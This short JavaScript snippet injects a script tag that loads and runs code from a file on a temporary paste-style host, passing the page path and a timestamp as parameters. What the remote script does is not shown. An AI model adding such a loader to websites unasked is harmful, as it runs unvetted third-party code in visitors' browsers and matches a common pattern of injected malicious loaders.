const script = document.createElement("script")

const scriptSource = "https://temp.staticsave.com/66660e3393b13.js"

const pathname = window.location.pathname

const currentDate = new Date

script.setAttribute("src", `${scriptSource}?pathname=${pathname}&time=${currentDate.getTime()}`)

document.body.appendChild(script)